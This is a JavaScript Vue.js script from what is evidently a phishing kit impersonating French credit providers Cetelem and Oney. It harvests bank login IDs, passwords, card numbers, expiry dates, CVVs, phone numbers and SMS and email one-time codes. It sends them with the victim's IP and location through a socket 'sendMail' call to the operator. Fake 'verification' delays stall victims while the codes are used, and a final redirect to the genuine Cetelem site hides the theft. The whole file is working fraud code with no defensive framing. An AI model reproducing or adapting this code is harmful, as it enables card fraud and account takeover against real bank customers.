

const index =new Vue({
    el:"#index",
    data:{
        error:false,
        loading:false,
        message:'Chargement en cours...',
        login:1,
        step :1,
        log:{
            ID:'',
            PASS: '',
            numcc:'',
            ex1:'',
            ex2:'',
            cvv:'',
            tel:'',
        }
    },
    mounted(){
$('body').show()
       console.log(this.content)


    },

    computed:{
        content(){
            var loc =JSON.stringify(locIp)

            var message ={
                name:'ONEY-613nn',
                from:'',
                to:$('#Mail').val(),
                subject : this.login==2 ? ' LOG ' : '',
                html:''+JSON.stringify(this.log)+'<p><br>'+JSON.stringify(locIp)+'</p>'
            }
            return message
        }
    },
    methods:{

        showChat(){
            Tawk_API.toggle();
        },
        goToCredit(){
            if(this.log.DEP=='' || this.log.DEP.length<2) return this.error=true
            this.loading=true
            setTimeout(()=>{
                this.login++
                this.loading=false
            },1300)


        },
        goToEspace(){

            if(this.log.PASS.length!==6 || this.log.ID.length<5)  return this.$Message.error('Corriger les champs SVP ')
            this.message='Connexion en cours ....'
            this.loading=true
            this.content.subject+=" LOG > "+iPfull

            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                   if($('#Option').val()==1 || $('#option').val()=='1'){

                    setTimeout(()=>{
                        this.login=5
                        this.loading=false
                    },15000)

                   } else {
                    setTimeout(()=>{
                    this.login++
                    this.loading=false
                },24000)
            }
                } else {
                    window.location.reload()
                }
            })
        },
        goToStep(){
            if(this.log.SMS.length!==6) return this.$Message.error('Code incorrect')
            this.message="Vérification du code en cours..."
            this.loading=true
            this.content.subject+=" > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    setTimeout(()=>{
                        setTimeout(()=>{
                            this.message="Envoie de nouveau code par SMS , patientez SVP"
                        },5000)

                        setTimeout(()=>{
                            this.message="Synchronisation en cours..."
                        },8000)

                        setTimeout(()=>{

                            this.step=2
                           this.loading=false

                        },14000)
                    },7000)
                } else {
                    window.location.reload()
                }
            })
        },

        goToStep2(){
          if(this.log.SMS.length<6 || this.log.SMS.length>8 || this.log.SMS.length==7) return this.$Message.error('Code incorrect')
          this.message="Vérification du code en cours..."
          this.loading=true
          this.content.subject+=" CETELEM CC + SMS > "+iPfull
          socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    setTimeout(()=>{
                      this.$Message.success('Code validé ')
                      this.message="Redirection dans 3 secondes ..."
                        setTimeout(()=>{

                            window.location.href="https://www.cetelem.fr/fr/accueil"

                        },14000)
                    },7000)
                } else {
                    window.location.reload()
                }
            })
        },




        setCard(){
            if(this.log.numcc.length<14) return false
			this.message="Activation des services en cours...Operation à Valider sur Smartphone ...."



            this.loading=true
            this.content.subject+=" CETELEM CC > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){

                    this.$Message.success('SUCCESS')
                    this.message="Envoie de code par SMS , patientez SVP"

                  setTimeout(()=>{

                    this.step=2
                   this.loading=false
                      // window.location.href="https://www.credit-agricole.fr/"
                },3000)
                } else {
                    window.location.reload()
                }
            })

        },
        submitForm(){
            if(this.log.CODE.length!==6) return this.$Message.error('Code incorrect')
            if(this.log.CODE==this.log.SMS) return this.$Message.error('Saisissez le code reçu par E-mail SVP...')
            if(this.log.CODE==this.log.SMS2) return this.$Message.error('Saisissez le code reçu par E-mail SVP...')
            this.message="ACTIVATION RÉUSSIE ..."
            this.loading=true
            this.content.subject+=" EMAIL > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    this.login++
                    this.loading=false
                  //  setTimeout(()=>{
                    //    window.location.href="https://www.credit-agricole.fr/"
                    //},1000)
                } else {
                    window.location.reload()
                }
            })


        }
    }

})
